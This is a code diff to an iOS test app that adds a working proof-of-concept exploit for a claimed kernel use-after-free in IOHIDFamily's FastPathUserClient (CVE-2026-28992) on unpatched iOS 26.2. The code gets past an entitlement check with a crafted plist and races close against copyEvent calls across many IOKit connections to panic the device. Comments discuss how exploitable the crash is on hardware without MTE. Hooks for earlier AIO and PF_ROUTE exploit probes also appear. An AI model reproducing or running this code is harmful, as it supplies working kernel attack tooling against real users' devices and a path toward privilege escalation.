@@ -147,6 +147,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *aioUafButton;
 @property (nonatomic, strong) UIButton   *pfRouteProbeButton;
 @property (nonatomic, assign) int         pfRoutePhase;
+@property (nonatomic, strong) UIButton   *iohidUAFButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -237,6 +238,8 @@ static const char kOpenPropertiesGarbage[] =
 - (void)runRemapAfterFreeProbe:(io_service_t)raceService;
 - (void)pfRouteProbeTapped;
 - (void)runPFRouteProbe;
+- (void)iohidUAFTapped;
+- (void)runIOHIDUAFProbe;
 @end
 
 // =======================================================================
@@ -642,6 +645,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.pfRouteProbeButton addTarget:self action:@selector(pfRouteProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.pfRouteProbeButton];
 
+    self.iohidUAFButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.iohidUAFButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *iohidConf = [UIButtonConfiguration filledButtonConfiguration];
+    iohidConf.baseBackgroundColor = [UIColor systemPurpleColor];
+    self.iohidUAFButton.configuration = iohidConf;
+    [self.iohidUAFButton setTitle:@"CVE-2026-28992 IOHID UAF v1" forState:UIControlStateNormal];
+    [self.iohidUAFButton addTarget:self action:@selector(iohidUAFTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.iohidUAFButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -661,7 +673,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
         [self.pfRouteProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.pfRouteProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:20],
+        [self.iohidUAFButton.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:12],
+        [self.iohidUAFButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.iohidUAFButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.iohidUAFButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -6943,6 +6958,233 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
     dispatch_async(dispatch_get_main_queue(), ^{
         [self appendLog:log];
     });
+}
+
+// =======================================================================
+// CVE-2026-28992: IOHIDFamily FastPathUserClient UAF
+// Target: iOS 26.2 (unpatched until 26.5), iPhone 13 (A15, no MTE)
+// v1 — Phase 1: Crash confirmation + register analysis
+// =======================================================================
+// COMPLETELY INDEPENDENT from AIO UAF and PF_ROUTE.
+// No shared state, no shared threads, no shared resources.
+// Isolation: separate button, separate dispatch queue, separate IOKit conns.
+// =======================================================================
+// Vulnerability:
+//   sel0 (open/gate) checks FastPathHasEntitlement in caller-supplied
+//   OSDictionary instead of task's entitlement flags → trivial bypass.
+//   sel1 (close) drops provider state, clears +0x109 with NO lock.
+//   sel2 (copyEvent) checks +0x108 under per-connection lock, then calls
+//   into provider. Multiple connections to same provider → close and
+//   copyEvent operate in DIFFERENT locking domains on SHARED objects → UAF.
+// =======================================================================
+// On A15 (no MTE): data abort crash (more exploitable than MTE tag fault)
+// On A17+ (MTE): MTE tag check fault
+// =======================================================================
+
+#define IOHID_NUM_CONNS         15
+#define IOHID_NUM_COPY_THREADS   8
+#define IOHID_RACE_SECONDS      25
+
+static volatile atomic_bool iohid_g_stop;
+static io_connect_t          iohid_g_conns[IOHID_NUM_CONNS];
+static NSData               *iohid_g_gateXML;
+
+static NSData *iohid_buildGateXML(void) {
+    NSDictionary *dict = @{
+        @"FastPathHasEntitlement":           @YES,
+        @"FastPathMotionEventEntitlement":   @YES,
+    };
+    NSError *err = nil;
+    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
+                                                             format:NSPropertyListXMLFormat_v1_0
+                                                            options:0
+                                                              error:&err];
+    if (!data) {
+        NSLog(@"[IOHID] gate XML failed: %@", err);
+    }
+    return data;
+}
+
+static kern_return_t iohid_gateConn(io_connect_t conn) {
+    uint64_t scalar = 0;
+    return IOConnectCallMethod(conn,
+                               0,  // sel0 = open/gate
+                               &scalar, 1,
+                               iohid_g_gateXML.bytes, iohid_g_gateXML.length,
+                               NULL, NULL,
+                               NULL, NULL);
+}
+
+// Thread A: rapid close→gate churn on conn[0]
+// close (sel1) drops provider state, clears +0x109 without lock.
+// gate (sel0) re-opens — forces provider state reallocation.
+static void *iohid_threadChurn(void *arg) {
+    (void)arg;
+    uint64_t scalar = 0;
+    while (!atomic_load(&iohid_g_stop)) {
+        IOConnectCallMethod(iohid_g_conns[0], 1,
+                            &scalar, 1, NULL, 0,
+                            NULL, NULL, NULL, NULL);
+        iohid_gateConn(iohid_g_conns[0]);
+    }
+    return NULL;
+}
+
+// Threads B..N: tight copyEvent loop on conn[1..14]
+// sel2 checks flag at +0x108 under per-conn lock, then calls into
+// provider whose state may be freed by thread A.
+typedef struct { int idx; } IOHIDCopyArg;
+
+static void *iohid_threadCopyEvent(void *arg) {
+    IOHIDCopyArg *a = (IOHIDCopyArg *)arg;
+    int idx = a->idx;
+    uint64_t args[2] = { 0, 1 };
+    while (!atomic_load(&iohid_g_stop)) {
+        IOConnectCallMethod(iohid_g_conns[idx], 2,
+                            args, 2, NULL, 0,
+                            NULL, NULL, NULL, NULL);
+    }
+    return NULL;
+}
+
+- (void)iohidUAFTapped {
+    static volatile int32_t _iohidRunning = 0;
+    if (!__sync_bool_compare_and_swap(&_iohidRunning, 0, 1)) {
+        [self appendLog:@"⚠ IOHIDFamily UAF already running"];
+        return;
+    }
+
+    @synchronized([ViewController class]) {
+        static int64_t _iohidLast = 0;
+        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+        if (now - _iohidLast < 3000) {
+            _iohidRunning = 0;
+            [self appendLog:@"⚠ Debounced"];
+            return;
+        }
+        _iohidLast = now;
+    }
+
+    [self appendLog:@"\n============================================================"];
+    [self appendLog:@"  CVE-2026-28992 v1 — IOHIDFamily FastPathUserClient UAF"];
+    [self appendLog:@"  Target: iOS 26.2 | iPhone 13 (A15, no MTE)"];
+    [self appendLog:@"  Patched: iOS 26.5 — UNPATCHED on this device"];
+    [self appendLog:@"  Race: close(sel1) vs copyEvent(sel2) — different lock domains"];
+    [self appendLog:@"  EXPECTED: Kernel panic (data abort). Device WILL reboot."];
+    [self appendLog:@"============================================================"];
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.iohidUAFButton.enabled = NO;
+        [self.iohidUAFButton setTitle:@"RACING..." forState:UIControlStateNormal];
+    });
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            [self runIOHIDUAFProbe];
+            _iohidRunning = 0;
+            dispatch_async(dispatch_get_main_queue(), ^{
+                self.iohidUAFButton.enabled = YES;
+                [self.iohidUAFButton setTitle:@"CVE-2026-28992 IOHID UAF v1" forState:UIControlStateNormal];
+            });
+        }
+    });
+}
+
+- (void)runIOHIDUAFProbe {
+    NSMutableString *log = [NSMutableString string];
+
+    [log appendString:@"\n--- IOHIDFamily UAF v1 Probe ---\n"];
+
+    // Step 1: Build entitlement bypass XML
+    iohid_g_gateXML = iohid_buildGateXML();
+    if (!iohid_g_gateXML) {
+        [log appendString:@"FAIL: Could not build gate XML\n"];
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+    [log appendFormat:@"[+] Gate XML: %lu bytes\n", (unsigned long)iohid_g_gateXML.length];
+
+    // Step 2: Find IOHIDEventService
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("IOHIDEventService"));
+    if (!service) {
+        [log appendString:@"FAIL: IOHIDEventService not found\n"];
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+    [log appendFormat:@"[+] IOHIDEventService: 0x%x\n", service];
+
+    // Step 3: Open 15 connections (type 2 = FastPathUserClient)
+    int openedConns = 0;
+    for (int i = 0; i < IOHID_NUM_CONNS; i++) {
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 2, &iohid_g_conns[i]);
+        if (kr != KERN_SUCCESS) {
+            [log appendFormat:@"[-] IOServiceOpen[%d] type=2 failed: 0x%x\n", i, kr];
+            continue;
+        }
+        kr = iohid_gateConn(iohid_g_conns[i]);
+        if (kr != KERN_SUCCESS) {
+            [log appendFormat:@"[-] gate[%d] failed: 0x%x\n", i, kr];
+        }
+        openedConns++;
+    }
+    [log appendFormat:@"[+] Opened %d/%d connections to IOHIDEventService\n",
+        openedConns, IOHID_NUM_CONNS];
+
+    if (openedConns < 3) {
+        [log appendString:@"FAIL: Need at least 3 connections for race\n"];
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+
+    // Step 4: Write crash-site marker
+    NSString *marker = [NSTemporaryDirectory()
+        stringByAppendingPathComponent:@"iohid_uaf_v1_started.txt"];
+    [@"iohid_uaf_v1" writeToFile:marker atomically:YES
+                        encoding:NSUTF8StringEncoding error:nil];
+
+    // Step 5: Flush log BEFORE starting race (survives panic)
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+
+    // Step 6: Start race threads
+    atomic_store(&iohid_g_stop, false);
+
+    pthread_t churnThread;
+    pthread_create(&churnThread, NULL, iohid_threadChurn, NULL);
+
+    pthread_t copyThreads[IOHID_NUM_COPY_THREADS];
+    IOHIDCopyArg copyArgs[IOHID_NUM_COPY_THREADS];
+    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) {
+        copyArgs[i].idx = (i % (openedConns - 1)) + 1;  // distribute across conn[1..N]
+        pthread_create(&copyThreads[i], NULL, iohid_threadCopyEvent, &copyArgs[i]);
+    }
+
+    NSLog(@"[IOHID] %d churn + %d copyEvent threads racing — waiting for panic...",
+         1, IOHID_NUM_COPY_THREADS);
+
+    // Step 7: Wait for panic (usually < 5 seconds)
+    sleep(IOHID_RACE_SECONDS);
+
+    // If we reach here, device survived
+    atomic_store(&iohid_g_stop, true);
+    pthread_join(churnThread, NULL);
+    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) pthread_join(copyThreads[i], NULL);
+
+    // Cleanup connections
+    for (int i = 0; i < IOHID_NUM_CONNS; i++) {
+        if (iohid_g_conns[i]) IOServiceClose(iohid_g_conns[i]);
+    }
+
+    [[NSFileManager defaultManager] removeItemAtPath:marker error:nil];
+
+    NSMutableString *surviveLog = [NSMutableString string];
+    [surviveLog appendString:@"\n--- IOHIDFamily UAF v1: DEVICE SURVIVED ---\n"];
+    [surviveLog appendString:@"  Possible reasons:\n"];
+    [surviveLog appendString:@"  1. IOHIDEventService type=2 rejected on iOS 26.2\n"];
+    [surviveLog appendString:@"  2. Entitlement bypass failed (gate returned error)\n"];
+    [surviveLog appendString:@"  3. Race window not hit in 25s (unlikely)\n"];
+    [surviveLog appendString:@"  4. CVE-2026-28992 already patched on this build\n"];
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:surviveLog]; });
 }
 
 @end
